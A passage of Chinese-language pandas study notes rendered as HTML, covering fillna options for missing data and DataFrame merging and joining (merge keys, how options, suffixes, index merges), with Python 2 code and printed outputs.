<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">          0         1         2</span><br><span class="line">0  1.244206       NaN       NaN</span><br><span class="line">1  0.911635       NaN       NaN</span><br><span class="line">2 -1.139608       NaN       NaN</span><br><span class="line">3 -1.234194       NaN  0.179958</span><br><span class="line">4  0.377242       NaN -0.576781</span><br><span class="line">5  0.208960 -0.745873  0.471753</span><br><span class="line">6 -0.395019 -0.442547 -0.354554</span><br><span class="line"></span><br><span class="line">          0         1         2</span><br><span class="line">5  0.208960 -0.745873  0.471753</span><br><span class="line">6 -0.395019 -0.442547 -0.354554</span><br><span class="line"></span><br><span class="line">          0         1         2</span><br><span class="line">5  0.208960 -0.745873  0.471753</span><br><span class="line">6 -0.395019 -0.442547 -0.354554</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
<li><p>填充缺失数据</p>
<ol>
<li><p>fillna方法</p>
<ol>
<li><p>基本填充</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参数为填充值</span></span><br><span class="line"><span class="keyword">print</span> df.fillna(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#对不同列填充不同的值</span></span><br><span class="line"><span class="keyword">print</span> df.fillna(&#123;<span class="number">1</span>:<span class="number">0.5</span>, <span class="number">2</span>:<span class="number">-1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接修改对象</span></span><br><span class="line">_ = df.fillna(<span class="number">0</span>, inplace = <span class="literal">True</span>)</span><br><span class="line"><span class="keyword">print</span> df</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">          0         1         2</span><br><span class="line">0  1.244206  0.000000  0.000000</span><br><span class="line">1  0.911635  0.000000  0.000000</span><br><span class="line">2 -1.139608  0.000000  0.000000</span><br><span class="line">3 -1.234194  0.000000  0.179958</span><br><span class="line">4  0.377242  0.000000 -0.576781</span><br><span class="line">5  0.208960 -0.745873  0.471753</span><br><span class="line">6 -0.395019 -0.442547 -0.354554</span><br><span class="line">          0         1         2</span><br><span class="line">0  1.244206  0.500000 -1.000000</span><br><span class="line">1  0.911635  0.500000 -1.000000</span><br><span class="line">2 -1.139608  0.500000 -1.000000</span><br><span class="line">3 -1.234194  0.500000  0.179958</span><br><span class="line">4  0.377242  0.500000 -0.576781</span><br><span class="line">5  0.208960 -0.745873  0.471753</span><br><span class="line">6 -0.395019 -0.442547 -0.354554</span><br><span class="line">          0         1         2</span><br><span class="line">0  1.244206  0.000000  0.000000</span><br><span class="line">1  0.911635  0.000000  0.000000</span><br><span class="line">2 -1.139608  0.000000  0.000000</span><br><span class="line">3 -1.234194  0.000000  0.179958</span><br><span class="line">4  0.377242  0.000000 -0.576781</span><br><span class="line">5  0.208960 -0.745873  0.471753</span><br><span class="line">6 -0.395019 -0.442547 -0.354554</span><br></pre></td></tr></table></figure>
</li>
<li><p>其他插值方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">6</span>,<span class="number">3</span>))</span><br><span class="line">df.ix[<span class="number">2</span>:,<span class="number">1</span>] = NA; df.ix[<span class="number">4</span>:, <span class="number">2</span>] =NA</span><br><span class="line"><span class="keyword">print</span> df</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df.fillna(method = <span class="string">'ffill'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df.fillna(method = <span class="string">'ffill'</span>, limit = <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">          0         1         2</span><br><span class="line">0  0.286912  0.421018 -0.387265</span><br><span class="line">1  0.587183  1.687635  0.956850</span><br><span class="line">2 -0.173152       NaN  0.771322</span><br><span class="line">3 -1.854829       NaN -0.338808</span><br><span class="line">4  0.296490       NaN       NaN</span><br><span class="line">5 -0.217154       NaN       NaN</span><br><span class="line"></span><br><span class="line">          0         1         2</span><br><span class="line">0  0.286912  0.421018 -0.387265</span><br><span class="line">1  0.587183  1.687635  0.956850</span><br><span class="line">2 -0.173152  1.687635  0.771322</span><br><span class="line">3 -1.854829  1.687635 -0.338808</span><br><span class="line">4  0.296490  1.687635 -0.338808</span><br><span class="line">5 -0.217154  1.687635 -0.338808</span><br><span class="line"></span><br><span class="line">          0         1         2</span><br><span class="line">0  0.286912  0.421018 -0.387265</span><br><span class="line">1  0.587183  1.687635  0.956850</span><br><span class="line">2 -0.173152  1.687635  0.771322</span><br><span class="line">3 -1.854829  1.687635 -0.338808</span><br><span class="line">4  0.296490       NaN -0.338808</span><br><span class="line">5 -0.217154       NaN -0.338808</span><br></pre></td></tr></table></figure>
</li>
<li><p>fillna函数的参数</p>
<p>|   参数      |      说明                            |<br>|————-|—————————————————|<br>| value   | 用于填充缺失值的标量值或字典对象 |<br>| method  | 插值方式。默认 ffill             |<br>| axis    | 待填充的轴，默认axis = 0         |<br>| inplace | 修改调用者对象而不产生副本       |<br>| limit   | 限定可连续填充的最大数量         |</p>
</li>
</ol>
</li>
</ol>
</li>
<li><p>层次化索引</p>
<ol>
<li><p>可以在一个轴上拥有多个索引级别</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h1 id="Chapter-7-数据规整化"><a href="#Chapter-7-数据规整化" class="headerlink" title="Chapter 7: 数据规整化"></a>Chapter 7: 数据规整化</h1><h2 id="合并数据集"><a href="#合并数据集" class="headerlink" title="合并数据集"></a>合并数据集</h2><h3 id="数据库风格的DF合并"><a href="#数据库风格的DF合并" class="headerlink" title="数据库风格的DF合并"></a>数据库风格的DF合并</h3><ol>
<li><p>简单例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">df1 = pd.DataFrame(&#123;<span class="string">'key'</span>: [<span class="string">'b'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>],</span><br><span class="line">                    <span class="string">'data1'</span>: range(<span class="number">7</span>)&#125;)</span><br><span class="line">df2 = pd.DataFrame(&#123;<span class="string">'key'</span>: [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'d'</span>],</span><br><span class="line">                    <span class="string">'data2'</span>:range(<span class="number">3</span>)&#125;)</span><br><span class="line"><span class="keyword">print</span> df1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#合并(不显示），重叠列的列名当做键（如key)</span></span><br><span class="line"><span class="keyword">print</span> pd.merge(df1,df2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#显示合并</span></span><br><span class="line"><span class="keyword">print</span> pd.merge(df1,df2, on = <span class="string">'key'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   data1 key</span><br><span class="line">0      0   b</span><br><span class="line">1      1   b</span><br><span class="line">2      2   a</span><br><span class="line">3      3   c</span><br><span class="line">4      4   a</span><br><span class="line">5      5   a</span><br><span class="line">6      6   b</span><br><span class="line"></span><br><span class="line">   data2 key</span><br><span class="line">0      0   a</span><br><span class="line">1      1   b</span><br><span class="line">2      2   d</span><br><span class="line"></span><br><span class="line">   data1 key  data2</span><br><span class="line">0      0   b      1</span><br><span class="line">1      1   b      1</span><br><span class="line">2      6   b      1</span><br><span class="line">3      2   a      0</span><br><span class="line">4      4   a      0</span><br><span class="line">5      5   a      0</span><br></pre></td></tr></table></figure>
<ol>
<li><p>不同列名，分别指定合并</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">df3 = pd.DataFrame(&#123;<span class="string">'lkey'</span>: list(<span class="string">"bbacaab"</span>),</span><br><span class="line">                    <span class="string">"data1"</span>: range(<span class="number">7</span>)&#125;)</span><br><span class="line">df4 = pd.DataFrame(&#123;<span class="string">'rkey'</span>: list(<span class="string">'abd'</span>),</span><br><span class="line">                    <span class="string">'data2'</span>:range(<span class="number">3</span>)&#125;)</span><br><span class="line"><span class="keyword">print</span> df3</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df4</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#合并，连接左右key</span></span><br><span class="line"><span class="keyword">print</span> pd.merge(df3,df4,left_on = <span class="string">'lkey'</span>,right_on = <span class="string">'rkey'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   data1 lkey</span><br><span class="line">0      0    b</span><br><span class="line">1      1    b</span><br><span class="line">2      2    a</span><br><span class="line">3      3    c</span><br><span class="line">4      4    a</span><br><span class="line">5      5    a</span><br><span class="line">6      6    b</span><br><span class="line"></span><br><span class="line">   data2 rkey</span><br><span class="line">0      0    a</span><br><span class="line">1      1    b</span><br><span class="line">2      2    d</span><br><span class="line"></span><br><span class="line">   data1 lkey  data2 rkey</span><br><span class="line">0      0    b      1    b</span><br><span class="line">1      1    b      1    b</span><br><span class="line">2      6    b      1    b</span><br><span class="line">3      2    a      0    a</span><br><span class="line">4      4    a      0    a</span><br><span class="line">5      5    a      0    a</span><br></pre></td></tr></table></figure>
<ol>
<li><p>但是默认用的是inner连接，所以键是交集</p>
</li>
<li><p>how选项</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> pd.merge(df3, df4, how = <span class="string">'outer'</span>, left_on = <span class="string">'lkey'</span>, right_on = <span class="string">'rkey'</span> )</span><br><span class="line"><span class="keyword">print</span> pd.merge(df3, df4, how = <span class="string">'left'</span>, left_on = <span class="string">'lkey'</span>, right_on = <span class="string">'rkey'</span> )</span><br><span class="line"><span class="keyword">print</span> pd.merge(df3, df4, how = <span class="string">'right'</span>, left_on = <span class="string">'lkey'</span>, right_on = <span class="string">'rkey'</span> )</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   data1 lkey  data2 rkey</span><br><span class="line">0    0.0    b    1.0    b</span><br><span class="line">1    1.0    b    1.0    b</span><br><span class="line">2    6.0    b    1.0    b</span><br><span class="line">3    2.0    a    0.0    a</span><br><span class="line">4    4.0    a    0.0    a</span><br><span class="line">5    5.0    a    0.0    a</span><br><span class="line">6    3.0    c    NaN  NaN</span><br><span class="line">7    NaN  NaN    2.0    d</span><br><span class="line">   data1 lkey  data2 rkey</span><br><span class="line">0      0    b    1.0    b</span><br><span class="line">1      1    b    1.0    b</span><br><span class="line">2      2    a    0.0    a</span><br><span class="line">3      3    c    NaN  NaN</span><br><span class="line">4      4    a    0.0    a</span><br><span class="line">5      5    a    0.0    a</span><br><span class="line">6      6    b    1.0    b</span><br><span class="line">   data1 lkey  data2 rkey</span><br><span class="line">0    0.0    b      1    b</span><br><span class="line">1    1.0    b      1    b</span><br><span class="line">2    6.0    b      1    b</span><br><span class="line">3    2.0    a      0    a</span><br><span class="line">4    4.0    a      0    a</span><br><span class="line">5    5.0    a      0    a</span><br><span class="line">6    NaN  NaN      2    d</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果合并的对象有重叠列名，可以用suffixes参数来区分列名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">left = pd.DataFrame(&#123;<span class="string">'key1'</span>: [<span class="string">'foo'</span>, <span class="string">'foo'</span>, <span class="string">'bar'</span>],</span><br><span class="line">                     <span class="string">"key2"</span>: [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>],</span><br><span class="line">                     <span class="string">"lval"</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]&#125;)</span><br><span class="line">right = pd.DataFrame(&#123;<span class="string">'key1'</span>: [<span class="string">'foo'</span>, <span class="string">'foo'</span>, <span class="string">'bar'</span>, <span class="string">'bar'</span>],</span><br><span class="line">                      <span class="string">"key2"</span>: [<span class="string">'one'</span>, <span class="string">'one'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>],</span><br><span class="line">                      <span class="string">"rval"</span>: [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]&#125;)</span><br><span class="line"><span class="keyword">print</span> left</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> right</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#多列合并</span></span><br><span class="line"><span class="keyword">print</span> pd.merge(left,right, on = [<span class="string">'key1'</span>,<span class="string">'key2'</span>], how = <span class="string">'outer'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重复列合并</span></span><br><span class="line"><span class="keyword">print</span> pd.merge(left,right, on = <span class="string">'key1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用suffixes来增加重复列的列名区分部分</span></span><br><span class="line"><span class="keyword">print</span> pd.merge(left,right, on = <span class="string">'key1'</span>, suffixes = (<span class="string">'_left'</span>, <span class="string">"_right"</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">  key1 key2  lval</span><br><span class="line">0  foo  one     1</span><br><span class="line">1  foo  two     2</span><br><span class="line">2  bar  one     3</span><br><span class="line"></span><br><span class="line">  key1 key2  rval</span><br><span class="line">0  foo  one     4</span><br><span class="line">1  foo  one     5</span><br><span class="line">2  bar  one     6</span><br><span class="line">3  bar  two     7</span><br><span class="line"></span><br><span class="line">  key1 key2  lval  rval</span><br><span class="line">0  foo  one   1.0   4.0</span><br><span class="line">1  foo  one   1.0   5.0</span><br><span class="line">2  foo  two   2.0   NaN</span><br><span class="line">3  bar  one   3.0   6.0</span><br><span class="line">4  bar  two   NaN   7.0</span><br><span class="line"></span><br><span class="line">  key1 key2_x  lval key2_y  rval</span><br><span class="line">0  foo    one     1    one     4</span><br><span class="line">1  foo    one     1    one     5</span><br><span class="line">2  foo    two     2    one     4</span><br><span class="line">3  foo    two     2    one     5</span><br><span class="line">4  bar    one     3    one     6</span><br><span class="line">5  bar    one     3    two     7</span><br><span class="line">  key1 key2_left  lval key2_right  rval</span><br><span class="line">0  foo       one     1        one     4</span><br><span class="line">1  foo       one     1        one     5</span><br><span class="line">2  foo       two     2        one     4</span><br><span class="line">3  foo       two     2        one     5</span><br><span class="line">4  bar       one     3        one     6</span><br><span class="line">5  bar       one     3        two     7</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>merge函数的参数</p>
<p>|     参数         |   说明                                                             |<br>|———————|————————————————————————————————|<br>| left         | 参与合并的左侧DataFrame                                        |<br>| right        | 参与合并的右侧DataFrame                                        |<br>| how          | “inner”,”outer”,”left”,”right”其中之一，默认”inner”            |<br>| on           | 用于连接的列名，必须存在于左右两个DF中                         |<br>|              | 如果未指定，则用left和right的列名的交集作为连接键              |<br>| left~on~     | 左侧DF用于连接键的列                                           |<br>| right~on~    | 右侧DF用于连接键的列                                           |<br>| left~index~  | 将左侧的行索引作为连接键                                       |<br>| right~index~ | 将右侧的行索引作为连接键                                       |<br>| sort         | 根据连接键合并后的数据进行排序，默认True                       |<br>|              | 在处理大数据时，禁用会获得更好的性能                           |<br>| suffixes     | 追加重叠列名的末尾，默认(“~x~”, “~y~”)                         |<br>| copy         | 设置为False,可以在避免将数据复制到结果数据结构中，默认重视复制 |</p>
</li>
</ol>
</li>
</ol>
<h3 id="索引上的合并"><a href="#索引上的合并" class="headerlink" title="索引上的合并"></a>索引上的合并</h3><ol>
<li><p>有些情况，可以传入left~index~ = True 或 right~index~ =<br>True(或都传)以说明索引来用作连接键</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left1 = pd.DataFrame(&#123;<span class="string">'key'</span>: list(<span class="string">'abaabc'</span>),</span><br><span class="line">                      <span class="string">"value"</span>: range(<span class="number">6</span>)&#125;)</span><br><span class="line">right1 = pd.DataFrame(&#123;<span class="string">'group_val'</span>:[<span class="number">3.5</span>,<span class="number">7</span>]&#125;,</span><br><span class="line">                       index = [<span class="string">'a'</span>, <span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">print</span> left1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> right1</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> pd.merge(left1, right1, left_on = <span class="string">'key'</span>, right_index = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  key  value</span><br><span class="line">0   a      0</span><br><span class="line">1   b      1</span><br><span class="line">2   a      2</span><br><span class="line">3   a      3</span><br><span class="line">4   b      4</span><br><span class="line">5   c      5</span><br><span class="line"></span><br><span class="line">   group_val</span><br><span class="line">a        3.5</span><br><span class="line">b        7.0</span><br><span class="line"></span><br><span class="line">  key  value  group_val</span><br><span class="line">0   a      0        3.5</span><br><span class="line">2   a      2        3.5</span><br><span class="line">3   a      3        3.5</span><br><span class="line">1   b      1        7.0</span><br><span class="line">4   b      4        7.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>层次化索引</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">lefth = pd.DataFrame(&#123;<span class="string">'key1'</span>: [<span class="string">'Ohio'</span>, <span class="string">'Ohio'</span>, <span class="string">'Ohio'</span>, <span class="string">'Nevada'</span>, <span class="string">"Nevada"</span>],</span><br><span class="line">                      <span class="string">"key2"</span>: [<span class="number">2000</span>,<span class="number">2001</span>,<span class="number">2002</span>,<span class="number">2001</span>,<span class="number">2002</span>],</span><br><span class="line">                      <span class="string">"data"</span>: np.arange(<span class="number">5</span>)&#125;)</span><br><span class="line">righth = pd.DataFrame(np.arange(<span class="number">12</span>).reshape(<span class="number">6</span>,<span class="number">2</span>),</span><br><span class="line">                      index = [[<span class="string">'Nevada'</span>, <span class="string">'Nevada'</span>, <span class="string">'Ohio'</span>, <span class="string">'Ohio'</span>, <span class="string">'Ohio'</span>, <span class="string">'Ohio'</span>],</span><br><span class="line">                               [<span class="number">2001</span>, <span class="number">2000</span>, <span class="number">2000</span>, <span class="number">2000</span>, <span class="number">2001</span>, <span class="number">2002</span>]],</span><br><span class="line">                      columns = [<span class="string">'event1'</span>, <span class="string">'event2'</span>])</span><br><span class="line"><span class="keyword">print</span> lefth</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> righth</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#必须以列表的形式指明 用于合并键的多个列</span></span><br><span class="line"><span class="keyword">print</span> pd.merge(lefth, righth, left_on = [<span class="string">'key1'</span>, <span class="string">'key2'</span>],right_index = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   data    key1  key2</span><br><span class="line">0     0    Ohio  2000</span><br><span class="line">1     1    Ohio  2001</span><br><span class="line">2     2    Ohio  2002</span><br><span class="line">3     3  Nevada  2001</span><br><span class="line">4     4  Nevada  2002</span><br><span class="line"></span><br><span class="line">             event1  event2</span><br><span class="line">Nevada 2001       0       1</span><br><span class="line">       2000       2       3</span><br><span class="line">Ohio   2000       4       5</span><br><span class="line">       2000       6       7</span><br><span class="line">       2001       8       9</span><br><span class="line">       2002      10      11</span><br><span class="line"></span><br><span class="line">   data    key1  key2  event1  event2</span><br><span class="line">0     0    Ohio  2000       4       5</span><br><span class="line">0     0    Ohio  2000       6       7</span><br><span class="line">1     1    Ohio  2001       8       9</span><br><span class="line">2     2    Ohio  2002      10      11</span><br><span class="line">3     3  Nevada  2001       0       1</span><br></pre></td></tr></table></figure>
</li>
<li><p>join方法，更方便的实现索引合并</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">left2 = pd.DataFrame([[<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">4</span>], [<span class="number">5</span>,<span class="number">6</span>]],index = [<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'a'</span>],</span><br><span class="line">                     columns = [<span class="string">'Ohio'</span>,<span class="string">'Nevada'</span>])</span><br><span class="line">right2 = pd.DataFrame([[<span class="number">7</span>,<span class="number">8</span>],[<span class="number">9</span>, <span class="number">10</span>],[<span class="number">11</span>,<span class="number">12</span>],[<span class="number">13</span>, <span class="number">14</span>]],</span><br><span class="line">                      index = [<span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span> ], columns = [<span class="string">'Missouri'</span>, <span class="string">'Alabama'</span>])</span><br><span class="line"><span class="keyword">print</span> left2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> right2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#merge</span></span><br><span class="line"><span class="keyword">print</span> pd.merge(left2, right2, how = <span class="string">'outer'</span>, left_index = <span class="literal">True</span>, right_index = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#join</span></span><br><span class="line"><span class="keyword">print</span> left2.join(right2, how = <span class="string">'outer'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   Ohio  Nevada</span><br><span class="line">a     1       2</span><br><span class="line">c     3       4</span><br><span class="line">a     5       6</span><br><span class="line"></span><br><span class="line">   Missouri  Alabama</span><br><span class="line">b         7        8</span><br><span class="line">c         9       10</span><br><span class="line">d        11       12</span><br><span class="line">e        13       14</span><br><span class="line"></span><br><span class="line">   Ohio  Nevada  Missouri  Alabama</span><br><span class="line">a   1.0     2.0       NaN      NaN</span><br><span class="line">a   5.0     6.0       NaN      NaN</span><br><span class="line">b   NaN     NaN       7.0      8.0</span><br><span class="line">c   3.0     4.0       9.0     10.0</span><br><span class="line">d   NaN     NaN      11.0     